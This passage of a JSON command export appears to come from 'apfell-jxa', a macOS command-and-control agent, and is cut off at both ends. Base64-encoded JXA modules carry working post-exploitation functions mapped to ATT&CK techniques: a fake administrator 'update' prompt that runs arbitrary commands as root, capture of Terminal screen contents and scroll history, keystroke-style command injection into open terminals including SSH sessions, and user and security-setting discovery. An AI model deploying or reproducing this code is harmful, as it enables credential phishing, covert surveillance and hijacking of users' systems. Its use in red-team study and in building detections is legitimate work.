              "hint": "What prompt to display to the user when asking for permission",
              "choices": "",
              "required": false,
              "name": "prompt"
            }
          ],
          "attack": [
            {
              "t_num": "T1059",
              "attack_name": "Command-Line Interface"
            },
            {
              "t_num": "T1141",
              "attack_name": "Input Prompt"
            },
            {
              "t_num": "T1169",
              "attack_name": "Sudo"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "\/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
              "replace_string": "*"
            },
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "\/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
              "replace_string": "*"
            },
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "\/bin\/sh -c *",
              "replace_string": "*"
            },
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "\/usr\/libexec\/security_authtrampoline \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid auth 15 \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
              "replace_string": "*"
            },
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "*",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "shell_elevated.js": "ZXhwb3J0cy5zaGVsbF9lbGV2YXRlZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IHJlc3BvbnNlID0gIiI7CiAgICAgICAgbGV0IHBpZWNlcyA9IFtdOwogICAgICAgIGxldCBjbWQgPSAiIjsKICAgICAgICBpZihwYXJhbXMubGVuZ3RoID4gMCl7IHBpZWNlcyA9IEpTT04ucGFyc2UocGFyYW1zKTsgfQogICAgICAgIGVsc2V7IHBpZWNlcyA9IFtdOyB9CiAgICAgICAgaWYocGllY2VzLmhhc093blByb3BlcnR5KCdjb21tYW5kJykgJiYgcGllY2VzWydjb21tYW5kJ10gIT09ICIiKXsKICAgICAgICAgICAgaWYocGllY2VzWydjb21tYW5kJ11bY29tbWFuZC5sZW5ndGggLTFdID09PSAiJiIpewogICAgICAgICAgICAgICAgY21kID0gcGllY2VzWydjb21tYW5kJ10gKyAiPiAvZGV2L251bGwgJiI7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgY21kID0gcGllY2VzWydjb21tYW5kJ107CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAibWlzc2luZyBjb21tYW5kIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICAgICAgbGV0IHVzZV9jcmVkcyA9IGZhbHNlOwogICAgICAgIGxldCBwcm9tcHQgPSAiQW4gYXBwbGljYXRpb24gbmVlZHMgcGVybWlzc2lvbiB0byB1cGRhdGUiOwogICAgICAgIGlmKHBpZWNlcy5oYXNPd25Qcm9wZXJ0eSgndXNlX2NyZWRzJykgJiYgdHlwZW9mIHBpZWNlc1sndXNlX2NyZWRzJ10gPT09ICJib29sZWFuIil7IHVzZV9jcmVkcyA9IHBpZWNlc1sndXNlX2NyZWRzJ107fQogICAgICAgIGlmKCF1c2VfY3JlZHMpewogICAgICAgICAgICBpZihwaWVjZXMuaGFzT3duUHJvcGVydHkoJ3Byb21wdCcpICYmIHBpZWNlc1sncHJvbXB0J10gIT09ICIiKXsgcHJvbXB0ID0gcGllY2VzWydwcm9tcHQnXTt9CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsd2l0aFByb21wdDpwcm9tcHR9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgICAgICAvLyBzaGVsbCBvdXRwdXQgdXNlcyBcciBpbnN0ZWFkIG9mIFxuIG9yIFxyXG4gdG8gbGluZSBlbmRpbmdzLCBmaXggdGhpcyBub25zZW5zZQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSBlcnJvci50b1N0cmluZygpLnJlcGxhY2UoL1xyL2csICJcbiIpOwogICAgICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOnJlc3BvbnNlLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIGxldCB1c2VyTmFtZSA9IGFwZmVsbC51c2VyOwogICAgICAgICAgICBsZXQgcGFzc3dvcmQgPSAiIjsKICAgICAgICAgICAgaWYocGllY2VzLmhhc093blByb3BlcnR5KCd1c2VyJykgJiYgcGllY2VzWyd1c2VyJ10gIT09ICIiKXsgdXNlck5hbWUgPSBwaWVjZXNbJ3VzZXInXTsgfQogICAgICAgICAgICBpZihwaWVjZXMuaGFzT3duUHJvcGVydHkoJ2NyZWRlbnRpYWwnKSl7IHBhc3N3b3JkID0gcGllY2VzWydjcmVkZW50aWFsJ107IH0KICAgICAgICAgICAgdHJ5ewogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSBjdXJyZW50QXBwLmRvU2hlbGxTY3JpcHQoY21kLCB7YWRtaW5pc3RyYXRvclByaXZpbGVnZXM6dHJ1ZSwgdXNlck5hbWU6dXNlck5hbWUsIHBhc3N3b3JkOnBhc3N3b3JkfSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICAgICAgLy8gc2hlbGwgb3V0cHV0IHVzZXMgXHIgaW5zdGVhZCBvZiBcbiBvciBcclxuIHRvIGxpbmUgZW5kaW5ncywgZml4IHRoaXMgbm9uc2Vuc2UKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gZXJyb3IudG9TdHJpbmcoKS5yZXBsYWNlKC9cci9nLCAiXG4iKTsKICAgICAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpyZXNwb25zZSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBzaGVsbCBvdXRwdXQgdXNlcyBcciBpbnN0ZWFkIG9mIFxuIG9yIFxyXG4gdG8gbGluZSBlbmRpbmdzLCBmaXggdGhpcyBub25zZW5zZQogICAgICAgIHJlc3BvbnNlID0gcmVzcG9uc2UucmVwbGFjZSgvXHIvZywgIlxuIik7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOnJlc3BvbnNlLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "terminals_read [history | contents]",
          "version": 4,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to read information about open instances of Apple's Terminal.app. The contents flag allows you to see exactly what the user can see at that moment on the screen. The history flag allows you to see everything that's in that tab's scroll history. This can be a lot of information, so keep that in mind. This function will also give you the window\/tab information for each open session and a bunch of other information.\nEx: terminals_read history",
          "cmd": "terminals_read",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "contents\nhistory",
              "required": true,
              "name": "level"
            }
          ],
          "attack": [
            {
              "t_num": "T1139",
              "attack_name": "Bash History"
            },
            {
              "t_num": "T1056",
              "attack_name": "Input Capture"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "terminals_read.js": "ZXhwb3J0cy50ZXJtaW5hbHNfcmVhZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBsZXQgc3BsaXRfcGFyYW1zID0ge307CiAgICB0cnl7CiAgICAgICAgc3BsaXRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KCWxldCBhbGxfZGF0YSA9IHt9OwoJdHJ5ewoJCWxldCB0ZXJtID0gQXBwbGljYXRpb24oIlRlcm1pbmFsIik7CgkJaWYodGVybS5ydW5uaW5nKCkpewogICAgICAgICAgICBsZXQgd2luZG93cyA9IHRlcm0ud2luZG93czsKICAgICAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHdpbmRvd3MubGVuZ3RoOyBpKyspewogICAgICAgICAgICAgICAgbGV0IHdpbl9pbmZvID0gewogICAgICAgICAgICAgICAgICAgICJOYW1lIjogd2luZG93c1tpXS5uYW1lKCksCiAgICAgICAgICAgICAgICAgICAgIlZpc2libGUiOiB3aW5kb3dzW2ldLnZpc2libGUoKSwKICAgICAgICAgICAgICAgICAgICAiRnJvbnRtb3N0Ijogd2luZG93c1tpXS5mcm9udG1vc3QoKSwKICAgICAgICAgICAgICAgICAgICAidGFicyI6IFtdCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgbGV0IGFsbF90YWJzID0gW107CiAgICAgICAgICAgICAgICAvLyBzdG9yZSB0aGUgd2luZG93cyBpbmZvcm1hdGlvbiBpbiBpZF93aW4gaW4gYWxsX2RhdGEKICAgICAgICAgICAgICAgIGFsbF9kYXRhWyJ3aW5kb3dfIiArIGldID0gd2luX2luZm87CiAgICAgICAgICAgICAgICBmb3IobGV0IGogPSAwOyBqIDwgd2luZG93c1tpXS50YWJzLmxlbmd0aDsgaisrKXsKICAgICAgICAgICAgICAgICAgICBsZXQgdGFiX2luZm8gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0YWIiOiBqLAogICAgICAgICAgICAgICAgICAgICAgICAiQnVzeSI6IHdpbmRvd3NbaV0udGFic1tqXS5idXN5KCksCiAgICAgICAgICAgICAgICAgICAgICAgICJQcm9jZXNzZXMiOiB3aW5kb3dzW2ldLnRhYnNbal0ucHJvY2Vzc2VzKCksCiAgICAgICAgICAgICAgICAgICAgICAgICJTZWxlY3RlZCI6IHdpbmRvd3NbaV0udGFic1tqXS5zZWxlY3RlZCgpLAogICAgICAgICAgICAgICAgICAgICAgICAiVFRZIjogd2luZG93c1tpXS50YWJzW2pdLnR0eSgpCiAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICBpZih3aW5kb3dzW2ldLnRhYnNbal0udGl0bGVEaXNwbGF5c0N1c3RvbVRpdGxlKCkpewogICAgICAgICAgICAgICAgICAgICAgICB0YWJfaW5mb1siQ3VzdG9tVGl0bGUiXSA9ICB3aW5kb3dzW2ldLnRhYnNbal0uY3VzdG9tVGl0bGUoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYoc3BsaXRfcGFyYW1zWydsZXZlbCddID09PSAnaGlzdG9yeScpewogICAgICAgICAgICAgICAgICAgICAgICB0YWJfaW5mb1siSGlzdG9yeSJdID0gd2luZG93c1tpXS50YWJzW2pdLmhpc3RvcnkoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYoc3BsaXRfcGFyYW1zWydsZXZlbCddID09PSAnY29udGVudHMnKXsKICAgICAgICAgICAgICAgICAgICAgICAgdGFiX2luZm9bIkNvbnRlbnRzIl0gPSB3aW5kb3dzW2ldLnRhYnNbal0uY29udGVudHMoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYWxsX3RhYnMucHVzaCh0YWJfaW5mbyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBzdG9yZSBhbGwgb2YgdGhlIHRhYiBpbmZvcm1hdGlvbiBjb3JyZXNwb25kaW5nIHRvIHRoYXQgd2luZG93IGlkIGF0IGlkX3RhYnMKICAgICAgICAgICAgICAgIHdpbl9pbmZvWyd0YWJzJ10gPSBhbGxfdGFiczsKICAgICAgICAgICAgfQogICAgICAgIH1lbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IlRlcm1pbmFsIGlzIG5vdCBydW5uaW5nIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CgoJfWNhdGNoKGVycm9yKXsKCSAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KCWxldCBvdXRwdXQgPSBKU09OLnN0cmluZ2lmeShhbGxfZGF0YSwgbnVsbCwgMik7CglyZXR1cm4geyJ1c2VyX291dHB1dCI6b3V0cHV0LCAiY29tcGxldGVkIjogdHJ1ZX07Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "level",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "terminals_read",
              "command_id": 43,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBsZXQgb3V0cHV0ID0gIiI7CiAgaWYodGFzay5zdGF0dXMgPT09ICdlcnJvcicpewogIAlyZXR1cm4gIjxwcmU+IEVycm9yOiB1bnRvZ2dsZSBmb3IgZXJyb3IgbWVzc2FnZShzKSA8L3ByZT4iOwogIH0KICBmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2VzLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VzW2ldWydyZXNwb25zZSddKTsKICAgICAgICBmb3IgKGNvbnN0IFtrZXksIHZhbHVlXSBvZiBPYmplY3QuZW50cmllcyhkYXRhKSkgewoJCSAgb3V0cHV0ICs9ICc8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBzaGFkb3ciIHN0eWxlPSJ0b3A6IDBweDsgYmFja2dyb3VuZC1jb2xvcjogIzM5MzQ4NTsgY29sb3I6IHdoaXRlOyI+JyArIAoJICAgICAga2V5ICsgIiB3aXRoIHRpdGxlOiAiICsgIlwiIiArIHZhbHVlWydOYW1lJ10gKyAiXCIiCgkgICAgICArICc8L2Rpdj4nOwoJICAgICAgZm9yKGxldCBqID0gMDsgaiA8IHZhbHVlWyd0YWJzJ10ubGVuZ3RoOyBqKyspewoJICAgICAgCW91dHB1dCArPSAnPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIgc2hhZG93IiBzdHlsZT0idG9wOiAwcHg7IGJhY2tncm91bmQtY29sb3I6IzIyOEIyMjsgY29sb3I6IHdoaXRlOyI+JyArIAoJCSAgICAidGFiXyIgKyB2YWx1ZVsndGFicyddW2pdWyd0YWInXSArICIgd2l0aCB0aXRsZTogIiArICJcIiIgKyB2YWx1ZVsndGFicyddW2pdWydDdXN0b21UaXRsZSddICsgIlwiIgoJCSAgICAgICsgJzwvZGl2Pic7CgkJICAgIG91dHB1dCArPSAiPHByZT4iICsgdmFsdWVbJ3RhYnMnXVtqXVsnQ29udGVudHMnXSArICI8L3ByZT4iOwoJICAgICAgfQoJCX0KICAgIH0KICAgIGNhdGNoKGVycm9yKXsKICAgICAgICAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQogIH0KCiAgcmV0dXJuIG91dHB1dDsKfQ=="
        },
        {
          "needs_admin": false,
          "help_cmd": "security_info {\"method\": api}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to list some security information about the system by contacting the \"System Events\" application via Apple Events. This can cause a popup or be denied in Mojave and later",
          "cmd": "security_info",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "jxa",
              "required": false,
              "name": "method"
            }
          ],
          "attack": [
            {
              "t_num": "T1201",
              "attack_name": "Password Policy Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "security_info.js": "ZXhwb3J0cy5zZWN1cml0eV9pbmZvID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICBsZXQgbWV0aG9kID0gImp4YSI7CiAgICAgICAgaWYocGFyYW1zLmxlbmd0aCA+IDApewogICAgICAgICAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgnbWV0aG9kJykgJiYgZGF0YVsnbWV0aG9kJ10gIT09ICIiKXsKICAgICAgICAgICAgICAgIG1ldGhvZCA9IGRhdGFbJ21ldGhvZCddOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmKG1ldGhvZCA9PT0gImp4YSIpewogICAgICAgICAgICBsZXQgc2VjT2JqID0gQXBwbGljYXRpb24oIlN5c3RlbSBFdmVudHMiKS5zZWN1cml0eVByZWZlcmVuY2VzKCk7CiAgICAgICAgICAgIGxldCBpbmZvID0gImF1dG9tYXRpY0xvZ2luOiAiICsgc2VjT2JqLmF1dG9tYXRpY0xvZ2luKCkgKwogICAgICAgICAgICAiXG5sb2dPdXRXaGVuSW5hY3RpdmU6ICIgKyBzZWNPYmoubG9nT3V0V2hlbkluYWN0aXZlKCkgKwogICAgICAgICAgICAiXG5sb2dPdXRXaGVuSW5hY3RpdmVJbnRlcnZhbDogIiArIHNlY09iai5sb2dPdXRXaGVuSW5hY3RpdmVJbnRlcnZhbCgpICsKICAgICAgICAgICAgIlxucmVxdWlyZVBhc3N3b3JkVG9VbmxvY2s6ICIgKyBzZWNPYmoucmVxdWlyZVBhc3N3b3JkVG9VbmxvY2soKSArCiAgICAgICAgICAgICJcbnJlcXVpcmVQYXNzd29yZFRvV2FrZTogIiArIHNlY09iai5yZXF1aXJlUGFzc3dvcmRUb1dha2UoKTsKICAgICAgICAgICAgLy8iXG5zZWN1cmVWaXJ0dWFsTWVtb3J5OiAiICsgc2VjT2JqLnNlY3VyZVZpcnR1YWxNZW1vcnkoKTsgLy9taWdodCBuZWVkIHRvIGJlIGluIGFuIGVsZXZhdGVkIGNvbnRleHQKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmluZm8sICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJNZXRob2Qgbm90IGtub3duIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "current_user",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to list information about the current user. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"api\".",
          "cmd": "current_user",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "api\njxa",
              "required": true,
              "name": "method"
            }
          ],
          "attack": [
            {
              "t_num": "T1033",
              "attack_name": "System Owner\/User Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "current_user.js": "ZXhwb3J0cy5jdXJyZW50X3VzZXIgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBtZXRob2QgPSAiYXBpIjsKICAgICAgICBpZihwYXJhbXMubGVuZ3RoID4gMCl7CiAgICAgICAgICAgIGxldCBkYXRhID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCdtZXRob2QnKSAmJiBkYXRhWydtZXRob2QnXSAhPT0gIiIpewogICAgICAgICAgICAgICAgbWV0aG9kID0gZGF0YVsnbWV0aG9kJ107CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYobWV0aG9kID09PSAianhhIil7CiAgICAgICAgICAgIGxldCB1c2VyID0gQXBwbGljYXRpb24oIlN5c3RlbSBFdmVudHMiKS5jdXJyZW50VXNlcjsKICAgICAgICAgICAgbGV0IGluZm8gPSAiTmFtZTogIiArIHVzZXIubmFtZSgpICsKICAgICAgICAgICAgIlxuRnVsbE5hbWU6ICIgKyB1c2VyLmZ1bGxOYW1lKCkgKwogICAgICAgICAgICAiXG5ob21lRGlyZWN0b3J5OiAiICsgdXNlci5ob21lRGlyZWN0b3J5KCkgKwogICAgICAgICAgICAiXG5waWN0dXJlUGF0aDogIiArIHVzZXIucGljdHVyZVBhdGgoKTsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmluZm8sICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZihtZXRob2QgPT09ICJhcGkiKXsKICAgICAgICAgICAgbGV0IG91dHB1dCA9ICJcblVzZXJOYW1lOiAiICsgJC5OU1VzZXJOYW1lKCkuanMgKwogICAgICAgICAgICAiXG5GdWxsIFVzZXJOYW1lOiAiICsgJC5OU0Z1bGxVc2VyTmFtZSgpLmpzICsKICAgICAgICAgICAgIlxuSG9tZSBEaXJlY3Rvcnk6ICIgKyAkLk5TSG9tZURpcmVjdG9yeSgpLmpzOwogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6b3V0cHV0LCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiTWV0aG9kIG5vdCBzdXBwb3J0ZWQiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This exits the current apfell-jxa instance by leveraging the ObjectiveC bridge's NSApplication terminate function.",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "exit.js": "ZXhwb3J0cy5leGl0ID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIEMyLnBvc3RSZXNwb25zZSh0YXNrLCB7ImNvbXBsZXRlZCI6IHRydWUsICJ1c2VyX291dHB1dCI6ICJFeGl0aW5nIn0pOwogICAgJC5OU0FwcGxpY2F0aW9uLnNoYXJlZEFwcGxpY2F0aW9uLnRlcm1pbmF0ZSh0aGlzKTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "terminals_send {'window': #, 'tab': #, 'command': 'command here to execute'}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to inject the shell command, {command}, into the specified terminal shell as if the user typed it from the keyboard. This is pretty powerful. Consider the instance where the user is SSH-ed into another machine via terminal - with this you can inject commands to run on the remote host. Just remember, the user will be able to see the command, but you can always see what they see as well with the \"terminals_read contents\" command.",
          "cmd": "terminals_send",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "window"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "tab"
            },
            {
              "type": "String",
              "hint": "command to execute",
              "choices": "",
              "required": false,
              "name": "command"
            }
          ],
          "attack": [
            {
              "t_num": "T1059",
              "attack_name": "Command-Line Interface"
            },
            {
              "t_num": "T1184",
              "attack_name": "SSH Hijacking"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "*",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "terminals_send.js": "ZXhwb3J0cy50ZXJtaW5hbHNfc2VuZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBsZXQgc3BsaXRfcGFyYW1zID0geyJ3aW5kb3ciOiAwLCAidGFiIjogMCwgImNvbW1hbmQiOiAiIn07CiAgICB0cnl7CiAgICAgICAgc3BsaXRfcGFyYW1zID0gT2JqZWN0LmFzc2lnbih7fSwgc3BsaXRfcGFyYW1zLCBKU09OLnBhcnNlKHBhcmFtcykpOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KCWxldCBvdXRwdXQgPSAiTm8gQ29tbWFuZCBPdXRwdXQiOwoJdHJ5ewoJCWxldCB0ZXJtID0gQXBwbGljYXRpb24oIlRlcm1pbmFsIik7CgkJaWYodGVybS5ydW5uaW5nKCkpewogICAgICAgICAgICBsZXQgd2luZG93ID0gc3BsaXRfcGFyYW1zWyd3aW5kb3cnXTsKICAgICAgICAgICAgbGV0IHRhYiA9IHNwbGl0X3BhcmFtc1sndGFiJ107CiAgICAgICAgICAgIGxldCBjbWQgPSBzcGxpdF9wYXJhbXNbJ2NvbW1hbmQnXTsKICAgICAgICAgICAgdGVybS5kb1NjcmlwdChjbWQsIHtpbjp0ZXJtLndpbmRvd3Nbd2luZG93XS50YWJzW3RhYl19KTsKICAgICAgICAgICAgb3V0cHV0ID0gdGVybS53aW5kb3dzW3dpbmRvd10udGFic1t0YWJdLmNvbnRlbnRzKCk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiVGVybWluYWwgaXMgbm90IHJ1bm5pbmciLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KCX0KCWNhdGNoKGVycm9yKXsKCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjpvdXRwdXQsICJjb21wbGV0ZWQiOiB0cnVlfTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "persist_launch",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
